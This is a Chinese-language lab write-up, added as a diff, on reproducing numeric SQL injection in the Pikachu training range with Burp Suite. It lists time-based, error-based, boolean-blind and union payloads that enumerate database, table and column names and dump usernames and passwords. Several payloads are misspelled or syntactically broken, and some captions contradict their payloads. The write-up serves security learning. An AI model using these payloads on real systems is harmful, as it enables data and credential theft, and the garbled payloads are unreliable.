@@ -1,0 +1,158 @@
+# 皮卡丘靶场-数字sql注入
+
+## 一、基本信息
+
+- 漏洞模块：sql注入
+- 子漏洞：数字sql注入
+- 工具：Burp Suite、浏览器
+- 目的：复现漏洞、通过复现漏洞了解数字sql的原理与完整流程
+
+## 二、漏洞原理
+
+  该漏洞主要是请求中的到的操作参数没有经过处理，直接拼接到sql语句中，如果这个参数是编写好的文本，这个文本会被当作sql语句执行，从而导致数据库数据泄露。
+
+## 三、复现步骤
+
+1. 在pikachu平台数字sql注入页面中选择一个参数，点击查询
+2. 在Burp Suite中捕获该请求，发送到Repeater
+3. 修改请求参数中id的值为`1 and if(substr(database(),1,1)='p',sleep(10),1)`，点击send
+4. 能看到页面空白，过了10秒才显示数据
+5. 依次修改请求参数中id的值为`1 and upadatexml(1,concat(0x7e,database()),1)`、
+   `1 and updatexml(1,concat(0x7e,select table_name from information_schema.tables where table_schema = database() limit 3,1),1)`、
+   `1 and updatexml(1,concat(0x7e,select column_name from information_schema.columns where table_schema = database() and table_name = 'users' limit 0,1),1)`，点击send
+6. 看到页面输出XPATH syntax error:'-pikachu'、XPATH syntax error:'-users'、XPATH syntax error:'-id'
+7. 依次修改请求参数中id的值为`1 and length(database()) > 8`
+   `1 and substr(database(),1,1) = 'p'`
+   `1 and substr((select table_name from information_schema.tables where table_schema = database() limit 3,1),1,1) = 'u'`
+   `1 and substr((select column_name from information_schema.columns where table_schema = database() and table_name = 'users' limit 0,1),1,1) = 'i'`
+8. 页面正常显示数据
+9. 依次修改请求参数id的值为`-1 union select 1,database()`
+   `-1 union select 1,table_name from information_schema.tables where table_schema = database() limit 0,5`
+   `-1 union select column_name from information_schema.columns where table_schema = database() and table_name = 'users' limit 0,5`
+10. 页面显示数据库名，该数据库下所有表名，该表下所有列名
+
+## 四、结果与总结
+
+- **结果**：成功复现漏洞，得到预期结果。
+- **总结**：这种数字sql注入主要是由于没对参数进行处理，直接拼接到sql中被当成sql执行，这种漏洞的危害很大，会导致数据库信息泄露，一般在后端数据交互层编写sql，都是采用#{id}这种预编译形式。具体注入方式有布尔盲注、联合注入、报错注入、时间盲注这四种方式，联合注入适合有回显数据的场景，报错注入通过在报错中携带数据，剩余两个盲注通过观察页面来判断。
+
+## 五、步骤截图
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入0.png)
+
+
+
+>   能看到后端是直接将参数拼接到sql中
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入1.png)
+
+
+
+>   选择一个参数点击查询
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入2.png)
+
+
+
+>   在Burp Suite中捕获到请求
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入3.png)
+
+
+
+>   将请求发送到Repeater
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入4.png)
+
+
+
+>   修改参数id的值为`1 and 1=2`、页面显示id不存在
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入5.png)
+
+
+
+>   修改参数id值为`-1 union select 1,database()`、页面显示数据库名
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入6.png)
+
+
+
+>   修改参数id值为`-1 union select 1,table_name from information_schema.tables where table_schema = database() limit 0,5`、页面显示该数据库下所有表名
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入7.png)
+
+
+
+>   修改参数id值为`-1 union select column_name from information_schema.columns where table_schema = database() and table_name = 'users' limit 0,5`、页面显示该表下所有列名
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入8.png)
+
+
+
+>   修改参数id值为`-1 union select username,password from users`、页面显示该表下所有用户的名称和密码
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入9.png)
+
+
+
+>   修改参数id值为`1 and upadatexml(1,concat(0x7e,database()),1)`、页面显示数据库名
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入10.png)
+
+
+
+>   修改参数id值为`1 and upadatexml(1,concat(0x7e,database()),1)`、
+> `1 and updatexml(1,concat(0x7e,select table_name from information_schema.tables where table_schema = database() limit 3,1),1)`、页面显示数据库下一个表名
+
+  ![步骤截图](/assets/images/pikachu/sql注入/数字sql注入11.png)
+
+
+
+>   修改参数id值为`1 and updatexml(1,concat(0x7e,select column_name from information_schema.columns where table_schema = database() and table_name = 'users' limit 0,1),1)`、页面显示表下一个列名
+
+  ![步骤截图](/assets/images/pikachu/sql注入/数字sql注入12.png)
+
+
+
+
+
+>   修改参数id值为`1 and updatexml(1,concat(0x7e,select concat(username,0x23,password) from user limit0,1),1)`、页面显示表下一个用户的名称和密码
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入13.png)
+
+
+
+> ​    修改参数id值为`1 and length(database()) > 8`、如果数据库名长度大于8页面显示id为1的数据，否则显示id不存在
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入14.png)
+
+
+
+>   修改参数id值为`1 and substr(database(),1,1) = 'p'`、如果数据库名第一字符为s页面显示id为1的数据，否则显示id不存在
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入15.png)
+
+
+
+>    修改参数id值为`1 and substr((select table_name from information_schema.tables where table_schema = database() limit 3,1),1,1) = 'u'`、如果该表第一字符为u页面显示id为1的数据，否则显示id不存在
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入16.png)
+
+  
+
+> ​    修改参数id值为`1 and substr((select table_name from information_schema.tables where table_schema = database() limit 3,1),1,1) = 'u'`、如果该表第一个列的第一个字符为u页面显示id为1的数据，否则显示id不存在
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入17.png)
+
+
+
+
+
+>    修改参数id值为`1 and substr((select username from users limit 0,1,1,1) = 'a'`、如果该表第一个用户的名称的第一个字符为u页面显示id为1的数据，否则显示id不存在
+
+![步骤截图](/assets/images/pikachu/sql注入/数字sql注入18.png)
+
+
+
+> ​    修改参数id值为`1 and if(substr(database(),1,1)='p',sleep(10),1)`，如果数据库名称第一个字符为p页面显示空白10秒后显示id为1的数据
